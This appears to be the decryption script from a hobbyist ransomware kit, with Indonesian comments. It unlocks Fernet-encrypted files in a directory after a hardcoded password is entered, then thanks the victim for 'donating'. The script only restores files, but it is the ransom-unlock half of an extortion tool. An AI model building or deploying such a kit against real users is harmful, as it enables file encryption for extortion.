import os
from cryptography.fernet import Fernet
#tempat untuk menampung nama-nama file
files = []

#perulangan for untuk mencari file
for file in os.listdir():
        if file =="Ransomware1.py" or file =="thekey.key" or file =="dekripR1.py":
            continue
        if os.path.isfile(file):
            files.append(file)
            
print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretPass = "Leosycthe"

userPass = input("\n Enter the secret password to decrypt your file!!: ")

if userPass == "Leosycthe":
    for file in files:
        with open(file,"rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file,"wb") as thefile:
            thefile.write(contents_decrypted)
    print("\n------------------------------------------------------------------------------------------------")
    print("\nThankyou for donate!!!")
    print("\n------------------------------------------------------------------------------------------------")
else:
    print("\n------------------------------------------------------------------------------------------------")
    print("\nWrong password")
    print("\n------------------------------------------------------------------------------------------------")

